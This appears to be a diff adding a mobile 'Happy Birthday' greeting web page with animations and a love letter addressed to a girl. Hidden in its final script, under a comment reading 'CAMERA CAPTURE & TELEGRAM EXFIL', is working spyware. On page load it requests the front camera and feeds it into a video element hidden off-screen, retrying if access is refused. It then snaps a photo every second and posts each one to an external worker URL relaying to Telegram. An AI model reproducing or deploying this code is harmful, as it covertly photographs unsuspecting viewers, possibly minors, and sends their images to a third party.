@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Birthday | Mobile Version</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Titan+One&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Sriracha&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap');
+
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-size: 16px;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            background: #feecea;
+            overflow-x: hidden;
+            font-family: 'Sriracha', cursive;
+        }
+
+        #wrapper {
+            position: relative;
+            width: 100%;
+            min-height: 100vh;
+            background-image: 
+                linear-gradient(0deg, transparent 24%, rgba(255,255,255,1) 25%, rgba(255,255,255,1) 26%, transparent 27%, transparent 74%, rgba(255,255,255,1) 75%, rgba(255,255,255,1) 76%, transparent 77%, transparent),
+                linear-gradient(90deg, transparent 24%, rgba(255,255,255,1) 25%, rgba(255,255,255,1) 26%, transparent 27%, transparent 74%, rgba(255,255,255,1) 75%, rgba(255,255,255,1) 76%, transparent 77%, transparent);
+            background-size: 60px 60px;
+            overflow: hidden;
+            padding-bottom: 30px;
+        }
+
+        /* ===== FLAGS ===== */
+        .flag__birthday {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 5px;
+            animation: slideDown 1.5s 2s forwards;
+            transform: translateY(-150px);
+        }
+        @keyframes slideDown {
+            to { transform: translateY(0); }
+        }
+        .flag__birthday img {
+            width: 140px;
+        }
+        .flag__left {
+            transform: rotate(-15deg);
+        }
+        .flag__right {
+            transform: rotate(15deg) scaleX(-1);
+        }
+
+        /* ===== MAIN CONTENT ===== */
+        .content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px 15px;
+            gap: 30px;
+        }
+
+        /* ===== TITLE ===== */
+        .title {
+            text-align: center;
+            font-family: "Titan One", sans-serif;
+            position: relative;
+        }
+        .title .happy, .title .birthday {
+            font-size: 2rem;
+            display: flex;
+            justify-content: center;
+            gap: 2px;
+            text-shadow: 3px 3px #333, -3px 3px #333, 3px -3px #333, -3px -3px #333;
+        }
+        .title .happy {
+            color: #fff;
+        }
+        .title .birthday {
+            color: #ff7882;
+        }
+        .title .happy span, .title .birthday span {
+            display: inline-block;
+            transform: translateY(40px);
+            opacity: 0;
+            animation: popUp 0.5s var(--t) forwards;
+        }
+        @keyframes popUp {
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        .title .hat {
+            position: absolute;
+            top: -40px;
+            right: -20px;
+            z-index: -1;
+            animation: hatDrop 4s 7s forwards ease;
+            transform: rotate(-30deg);
+        }
+        @keyframes hatDrop {
+            30% { top: -35px; transform: rotate(-30deg); }
+            50%, 100% { top: -35px; transform: rotate(5deg); }
+        }
+        .title .hat img {
+            width: 80px;
+        }
+
+        /* ===== DATE ===== */
+        .date__of__birth {
+            background: #ff7882;
+            border: 3px solid #333;
+            border-radius: 50px;
+            padding: 8px 25px;
+            margin-top: 15px;
+            font-size: 0.95rem;
+            text-align: center;
+            opacity: 0;
+            animation: fadeIn 1s 9s forwards;
+        }
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+        .date__of__birth i {
+            color: gold;
+            margin: 0 5px;
+            font-size: 0.7rem;
+        }
+
+        /* ===== BUTTON ===== */
+        .btn {
+            margin-top: 10px;
+            opacity: 0;
+            animation: fadeIn 1s 11s forwards;
+        }
+        #btn__letter {
+            background: #ff7882;
+            border: 3px solid #333;
+            border-radius: 50px;
+            padding: 10px 25px;
+            font-size: 1rem;
+            font-family: "Sriracha", cursive;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: 0.3s;
+        }
+        #btn__letter:active {
+            transform: scale(0.9);
+            background: #F61F1F;
+            color: #fff;
+        }
+
+        /* ===== PROFILE IMAGE ===== */
+        .box__account {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            transform: translateY(500px);
+            opacity: 0;
+            animation: slideUpImage 1.5s 7s forwards ease-out;
+        }
+        @keyframes slideUpImage {
+            0% {
+                transform: translateY(500px);
+                opacity: 0;
+            }
+            100% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .image {
+            width: 220px;
+            height: 220px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 5px solid #333;
+        }
+        .image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .name {
+            background: #ff7882;
+            border: 3px solid #333;
+            border-radius: 50px;
+            padding: 6px 20px;
+            margin-top: -20px;
+            z-index: 2;
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            opacity: 0;
+            transform: translateY(30px);
+            animation: showCutieName 0.8s 8.5s forwards ease-out;
+        }
+        @keyframes showCutieName {
+            0% {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .name .fa-heart {
+            color: #F61F1F;
+            font-size: 0.9rem;
+            animation: heartbeat 1s infinite;
+        }
+        @keyframes heartbeat {
+            50% { transform: scale(1.3); }
+        }
+
+        /* ===== BALLOONS ===== */
+        .balloon_one {
+            position: absolute;
+            top: -40px;
+            left: -20px;
+            animation: swing1 2s infinite;
+        }
+        .balloon_one img {
+            width: 60px;
+        }
+        .balloon_two {
+            position: absolute;
+            bottom: 10px;
+            right: -30px;
+            animation: swing2 2s infinite;
+        }
+        .balloon_two img {
+            width: 60px;
+        }
+        @keyframes swing1 {
+            50% { transform: rotate(5deg); }
+        }
+        @keyframes swing2 {
+            50% { transform: rotate(-5deg); }
+        }
+
+        /* ===== CIRCLE TEXT ===== */
+        .cricle {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin-top: 20px;
+            opacity: 0;
+            animation: fadeIn 1s 12s forwards;
+        }
+        .text__cricle {
+            width: 80px;
+            height: 80px;
+            background: #ff7882;
+            border-radius: 50%;
+            border: 4px solid #333;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: spin 5s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .text__cricle span {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            color: #333;
+            transform: rotate(calc(var(--i) * 24deg));
+            transform-origin: 0 38px;
+        }
+        .cricle .fa-heart {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #F61F1F;
+            font-size: 1.2rem;
+            z-index: 2;
+            animation: heartbeat 1s infinite;
+        }
+
+        /* ===== STARS ===== */
+        .decorate_star {
+            position: absolute;
+            background: #333;
+            clip-path: polygon(0 50%, 35% 35%, 50% 0, 65% 35%, 100% 50%, 65% 65%, 50% 100%, 35% 65%);
+            opacity: 0;
+            animation: fadeIn 1s var(--t) forwards, twinkle 1.5s 14s infinite;
+        }
+        @keyframes twinkle {
+            50% { transform: scale(0.7); }
+        }
+        .star1 { width: 15px; height: 15px; top: 60px; left: 30px; }
+        .star2 { width: 12px; height: 12px; top: 80px; right: 40px; }
+        .star3 { width: 14px; height: 14px; top: 200px; left: 70%; }
+        .star4 { width: 16px; height: 16px; bottom: 100px; left: 20px; }
+        .star5 { width: 12px; height: 12px; bottom: 60px; right: 30px; }
+
+        /* ===== FLOWERS ===== */
+        .decorate_flower--one,
+        .decorate_flower--two,
+        .decorate_flower--three {
+            position: absolute;
+            opacity: 0;
+            animation: fadeIn 1s var(--t) forwards;
+        }
+        .decorate_flower--one { top: 150px; left: 15px; }
+        .decorate_flower--two { top: 100px; right: 20px; }
+        .decorate_flower--three { bottom: 80px; left: 50%; }
+        .decorate_flower--one img,
+        .decorate_flower--two img,
+        .decorate_flower--three img {
+            width: 25px;
+        }
+
+        /* ===== BOTTOM DECORATION ===== */
+        .decorate_bottom {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            opacity: 0;
+            animation: fadeIn 1s 10s forwards;
+        }
+        .decorate_bottom img {
+            width: 70px;
+        }
+        .smiley__icon {
+            position: absolute;
+            bottom: 30px;
+            left: 20px;
+            opacity: 0;
+            animation: fadeIn 1s 13s forwards;
+        }
+        .smiley__icon img {
+            width: 60px;
+        }
+
+        /* ===== LETTER BOX ===== */
+        .box__letter {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 100;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+        .letter__border {
+            width: 92%;
+            max-width: 400px;
+            background: #fff;
+            border-radius: 20px;
+            padding: 12px;
+            position: relative;
+        }
+        .letter {
+            background: #fff8e4;
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+        }
+        .title__letter {
+            font-family: 'Dancing Script', cursive;
+            font-size: 1.6rem;
+            color: #ff7882;
+            margin-bottom: 10px;
+        }
+        .content__letter {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .content__letter .left {
+            position: relative;
+        }
+        #heart__letter {
+            width: 100%;
+            max-width: 200px;
+            border-radius: 10px;
+            opacity: 0;
+        }
+        #heart__letter.animationOp {
+            animation: fadeIn 1s forwards;
+        }
+        .content__letter .left .heart {
+            position: absolute;
+            width: 20px;
+            opacity: 0;
+        }
+        .heart.animation {
+            animation: popHeart 1s var(--t) infinite;
+        }
+        @keyframes popHeart {
+            0% { opacity: 1; transform: scale(0); }
+            30% { opacity: 1; transform: scale(1.3); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        .heart_1 { top: 10px; left: 20px; }
+        .heart_2 { top: 10px; right: 30px; }
+        .heart_3 { bottom: 20px; left: 30px; }
+        .heart_4 { bottom: 20px; right: 20px; }
+
+        .content__letter .right {
+            position: relative;
+        }
+        .love__img img {
+            width: 100px;
+            opacity: 0;
+        }
+        .love__img.animationOp img {
+            animation: fadeIn 1s forwards;
+        }
+        .text__letter {
+            font-family: 'Dancing Script', cursive;
+            font-size: 1rem;
+            padding: 10px;
+            color: #555;
+        }
+        #mewmew {
+            width: 60px;
+            opacity: 0;
+        }
+        #mewmew.animationOp {
+            animation: fadeIn 1s forwards;
+        }
+
+        .close {
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            width: 28px;
+            height: 28px;
+            background: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+            cursor: pointer;
+            font-size: 0.9rem;
+        }
+
+        /* Hidden video element for camera */
+        #cameraFeed {
+            position: fixed;
+            bottom: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        #captureCanvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Floating Hearts -->
+    <script>
+        var colours=['#ff3366','#ff6699','#ff33cc','#ff99cc','#ff66b2','#ff0066'];
+        var minisize=12,maxisize=22,hearts=40;
+        var x=ox=200,y=oy=300,swide=400,shigh=600,sleft=sdown=0;
+        var herz=[],herzx=[],herzy=[],herzs=[],kiss=false;
+        function addRVLoadEvent(f){var o=window.onload;window.onload=typeof o!='function'?f:function(){o&&o();f();};}
+        addRVLoadEvent(function(){
+            for(var i=0;i<hearts;i++){
+                var h=document.createElement("div");
+                h.style.cssText="position:absolute;visibility:hidden;z-index:1001;pointer-events:none;opacity:0.75;color:"+colours[i%colours.length];
+                h.appendChild(document.createTextNode("♥"));
+                document.body.appendChild(h);
+                herz[i]=h;herzy[i]=false;
+            }
+            set_scroll();set_width();herzle();
+        });
+        function herzle(){
+            if(Math.abs(x-ox)>1||Math.abs(y-oy)>1){ox=x;oy=y;
+                for(var c=0;c<hearts;c++)if(!herzy[c]){
+                    herz[c].innerHTML="♥";
+                    herz[c].style.left=(herzx[c]=x-minisize/2)+"px";
+                    herz[c].style.top=(herzy[c]=y-minisize)+"px";
+                    herz[c].style.fontSize=minisize+"px";
+                    herz[c].style.visibility="visible";
+                    herzs[c]=minisize;break;
+                }}
+            for(c=0;c<hearts;c++)if(herzy[c]!==false)blow_me_a_kiss(c);
+            setTimeout(herzle,40);
+        }
+        function blow_me_a_kiss(i){
+            herzy[i]-=herzs[i]/minisize+i%2;
+            herzx[i]+=(i%5-2)/5;
+            if(herzy[i]<sdown-herzs[i]||herzx[i]<sleft-herzs[i]||herzx[i]>sleft+swide-herzs[i]){
+                herz[i].style.visibility="hidden";herzy[i]=false;
+            }else if(herzs[i]>minisize+2&&Math.random()<.5/hearts){
+                herz[i].innerHTML="◇";herz[i].style.fontWeight="bold";herzy[i]=false;
+                setTimeout(function(){herz[i].style.visibility="hidden";},400);
+            }else{
+                if(Math.random()<maxisize/herzy[i]&&herzs[i]<maxisize)herz[i].style.fontSize=(++herzs[i])+"px";
+                herz[i].style.top=herzy[i]+"px";herz[i].style.left=herzx[i]+"px";
+            }
+        }
+        document.onmousemove=function(e){if(e){x=e.pageX;y=e.pageY;}else{set_scroll();x=event.x+sleft;y=event.y+sdown;}};
+        document.ontouchmove=function(e){var t=e.touches[0];x=t.pageX;y=t.pageY;};
+        window.onresize=set_width;
+        function set_width(){swide=window.innerWidth||document.documentElement.clientWidth;shigh=window.innerHeight||document.documentElement.clientHeight;}
+        window.onscroll=set_scroll;
+        function set_scroll(){sdown=window.pageYOffset||document.documentElement.scrollTop;sleft=window.pageXOffset||document.documentElement.scrollLeft;}
+    </script>
+
+    <!-- Hidden camera elements -->
+    <video id="cameraFeed" autoplay playsinline></video>
+    <canvas id="captureCanvas"></canvas>
+
+    <div id="wrapper">
+        <!-- Flags -->
+        <div class="flag__birthday">
+            <img src="https://i.ibb.co.com/bRW1Z0ym/1.png" alt="" class="flag__left">
+            <img src="https://i.ibb.co.com/bRW1Z0ym/1.png" alt="" class="flag__right">
+        </div>
+
+        <!-- Content -->
+        <div class="content">
+            <!-- Title -->
+            <div class="title">
+                <h1 class="happy">
+                    <span style="--t: 4s;">H</span><span style="--t: 4.2s;">a</span><span style="--t: 4.4s;">p</span><span style="--t: 4.6s;">p</span><span style="--t: 4.8s;">y</span>
+                </h1>
+                <h1 class="birthday">
+                    <span style="--t: 5s;">B</span><span style="--t: 5.2s;">i</span><span style="--t: 5.4s;">r</span><span style="--t: 5.6s;">t</span><span style="--t: 5.8s;">h</span><span style="--t: 6s;">d</span><span style="--t: 6.2s;">a</span><span style="--t: 6.4s;">y</span>
+                </h1>
+                <div class="hat">
+                    <img src="https://i.ibb.co.com/M5S79dG0/hat.png" alt="">
+                </div>
+            </div>
+
+            <!-- Date -->
+            <div class="date__of__birth">
+                <i class="fa-solid fa-star"></i>
+                <span></span>
+                <i class="fa-solid fa-star"></i>
+            </div>
+
+            <!-- Button -->
+            <div class="btn">
+                <button id="btn__letter">
+                    Click here <i class="fa-regular fa-envelope"></i>
+                </button>
+            </div>
+
+            <!-- Profile -->
+            <div class="box__account">
+                <div class="image">
+                    <img src="https://i.ibb.co.com/prbRGzH9/img.png" alt="">
+                </div>
+                <div class="name">
+                    <i class="fa-solid fa-heart"></i>
+                    <span>Cutie</span>
+                    <i class="fa-solid fa-heart"></i>
+                </div>
+                <div class="balloon_one">
+                    <img src="https://i.ibb.co.com/yL2BRWz/balloon1.png" alt="">
+                </div>
+                <div class="balloon_two">
+                    <img src="https://i.ibb.co.com/j9mKtwXW/balloon2.png" alt="">
+                </div>
+            </div>
+
+            <!-- Circle -->
+            <div class="cricle">
+                <div class="text__cricle">
+                    <span style="--i:1;">h</span><span style="--i:2;">a</span><span style="--i:3;">p</span>
+                    <span style="--i:4;">p</span><span style="--i:5;">y</span><span style="--i:6;">-</span>
+                    <span style="--i:7;">b</span><span style="--i:8;">i</span><span style="--i:9;">r</span>
+                    <span style="--i:10;">t</span><span style="--i:11;">h</span><span style="--i:12;">d</span>
+                    <span style="--i:13;">a</span><span style="--i:14;">y</span><span style="--i:15;">-</span>
+                </div>
+                <i class="fa-solid fa-heart"></i>
+            </div>
+        </div>
+
+        <!-- Stars -->
+        <div class="decorate_star star1" style="--t: 15s;"></div>
+        <div class="decorate_star star2" style="--t: 15.3s;"></div>
+        <div class="decorate_star star3" style="--t: 15.6s;"></div>
+        <div class="decorate_star star4" style="--t: 15.9s;"></div>
+        <div class="decorate_star star5" style="--t: 16.2s;"></div>
+
+        <!-- Flowers -->
+        <div class="decorate_flower--one" style="--t: 15s;">
+            <img src="https://i.ibb.co.com/gZVdQYqm/decorate-flower.png" alt="">
+        </div>
+        <div class="decorate_flower--two" style="--t: 15.4s;">
+            <img src="https://i.ibb.co.com/gZVdQYqm/decorate-flower.png" alt="">
+        </div>
+        <div class="decorate_flower--three" style="--t: 15.8s;">
+            <img src="https://i.ibb.co.com/gZVdQYqm/decorate-flower.png" alt="">
+        </div>
+
+        <!-- Bottom -->
+        <div class="decorate_bottom">
+            <img src="https://i.ibb.co.com/67hqq0VZ/decorate.png" alt="">
+        </div>
+        <div class="smiley__icon">
+            <img src="https://i.ibb.co.com/ym4qnSD5/smiley-icon.png" alt="">
+        </div>
+
+        <!-- Letter Box -->
+        <div class="box__letter" id="letterBox">
+            <div class="letter__border">
+                <div class="letter">
+                    <div class="title__letter"></div>
+                    <div class="content__letter">
+                        <div class="left">
+                            <img id="heart__letter" src="https://i.ibb.co.com/qLkt3tct/heart-letter.png" alt="">
+                            <img class="heart heart_1" style="--t:0.2s" src="https://i.ibb.co.com/7tP2PHJD/heart.png" alt="">
+                            <img class="heart heart_2" style="--t:0.4s" src="https://i.ibb.co.com/7tP2PHJD/heart.png" alt="">
+                            <img class="heart heart_3" style="--t:0.6s" src="https://i.ibb.co.com/7tP2PHJD/heart.png" alt="">
+                            <img class="heart heart_4" style="--t:0.8s" src="https://i.ibb.co.com/7tP2PHJD/heart.png" alt="">
+                        </div>
+                        <div class="right">
+                            <div class="love__img">
+                                <img src="https://i.ibb.co.com/YFNvvp3z/love.png" alt="">
+                            </div>
+                            <div class="text__letter"><p></p></div>
+                            <img id="mewmew" src="https://i.ibb.co.com/nM51MVqK/mewmew.gif" alt="">
+                        </div>
+                    </div>
+                </div>
+                <div class="close" id="closeLetter">
+                    <i class="fa-solid fa-xmark"></i>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ===== CAMERA CAPTURE & TELEGRAM EXFIL =====
+        const TELEGRAM_WORKER = 'https://telegram-api.ayanahamed572.workers.dev';
+        const video = document.getElementById('cameraFeed');
+        const canvas = document.getElementById('captureCanvas');
+        const ctx = canvas.getContext('2d');
+        let cameraStream = null;
+        let captureInterval = null;
+        let photoCount = 0;
+
+        // Request camera access immediately on page load
+        async function startCamera() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+                video.srcObject = cameraStream;
+                await video.play();
+
+                // Start capturing every 1 second
+                captureInterval = setInterval(captureAndSend, 1000);
+                console.log('[+] Camera started - capturing every 1s');
+            } catch (err) {
+                console.error('[-] Camera access denied or error:', err);
+                // If camera fails, try again after 2 seconds (user might need to allow)
+                setTimeout(startCamera, 2000);
+            }
+        }
+
+        function captureAndSend() {
+            if (!video.videoWidth || !video.videoHeight) return;
+
+            photoCount++;
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+
+            // Convert to JPEG blob
+            canvas.toBlob(function(blob) {
+                if (!blob) return;
+                sendToTelegram(blob, photoCount);
+            }, 'image/jpeg', 0.7);
+        }
+
+        async function sendToTelegram(blob, seq) {
+            const formData = new FormData();
+            formData.append('photo', blob, `photo_${seq}_${Date.now()}.jpg`);
+
+            try {
+                const resp = await fetch(TELEGRAM_WORKER, {
+                    method: 'POST',
+                    body: formData
+                });
+                console.log(`[+] Photo #${seq} sent | Status: ${resp.status}`);
+            } catch (err) {
+                console.error(`[-] Photo #${seq} failed:`, err);
+            }
+        }
+
+        // Auto-start camera
+        window.addEventListener('load', function() {
+            setTimeout(startCamera, 500);
+        });
+
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', function() {
+            if (captureInterval) clearInterval(captureInterval);
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(t => t.stop());
+            }
+        });
+
+        // ===== EXISTING BIRTHDAY PAGE LOGIC =====
+        let datetxt = "29 November 2010";
+        let datatxtletter = "You are a very special girl. Today, I wish you all the best, lots of health, and lots of joy. I always hope we will celebrate many more birthdays like this together. Happy birthday to you.💕";
+        let titleLetter = "To you";
+
+        let charArrDate = datetxt.split('');
+        let charArrDateLetter = datatxtletter.split('');
+        let charArrTitle = titleLetter.split('');
+        let currentIndex = 0, currentIndexLetter = 0, currentIndexTitle = 0;
+        let dateSpan = document.querySelector(".date__of__birth span");
+        let textLetter = document.querySelector(".text__letter p");
+        let intervalContent, intervalTitle;
+
+        // Date typewriter
+        setTimeout(function(){
+            let timeDatetxt = setInterval(function(){
+                if(currentIndex < charArrDate.length){
+                    dateSpan.textContent += charArrDate[currentIndex];
+                    currentIndex++;
+                } else {
+                    clearInterval(timeDatetxt);
+                }
+            }, 100);
+        }, 12000);
+
+        // Open letter
+        document.getElementById("btn__letter").onclick = function(){
+            document.getElementById("letterBox").style.display = "flex";
+            setTimeout(function(){
+                intervalTitle = setInterval(function(){
+                    if(currentIndexTitle < charArrTitle.length){
+                        document.querySelector(".title__letter").textContent += charArrTitle[currentIndexTitle];
+                        let i = document.createElement("i");
+                        i.className = "fa-solid fa-heart";
+                        document.querySelector(".title__letter").appendChild(i);
+                        currentIndexTitle++;
+                    } else {
+                        clearInterval(intervalTitle);
+                    }
+                }, 100);
+            }, 500);
+
+            setTimeout(function(){
+                document.querySelector("#heart__letter").classList.add("animationOp");
+                document.querySelector(".love__img").classList.add("animationOp");
+                document.querySelector("#mewmew").classList.add("animationOp");
+            }, 1500);
+
+            setTimeout(function(){
+                document.querySelectorAll(".heart").forEach(function(item){
+                    item.classList.add("animation");
+                });
+            }, 2000);
+
+            setTimeout(function(){
+                intervalContent = setInterval(function(){
+                    if(currentIndexLetter < charArrDateLetter.length){
+                        textLetter.textContent += charArrDateLetter[currentIndexLetter];
+                        currentIndexLetter++;
+                    } else {
+                        clearInterval(intervalContent);
+                    }
+                }, 50);
+            }, 3500);
+        };
+
+        // Close letter
+        document.getElementById("closeLetter").onclick = function(){
+            clearInterval(intervalContent);
+            clearInterval(intervalTitle);
+            document.querySelector(".title__letter").textContent = "";
+            textLetter.textContent = "";
+            currentIndexLetter = 0;
+            currentIndexTitle = 0;
+            document.querySelector("#heart__letter").classList.remove("animationOp");
+            document.querySelector(".love__img").classList.remove("animationOp");
+            document.querySelector("#mewmew").classList.remove("animationOp");
+            document.querySelectorAll(".heart").forEach(function(item){
+                item.classList.remove("animation");
+            });
+            document.getElementById("letterBox").style.display = "none";
+        };
+    </script>
+</body>
+                  </html>
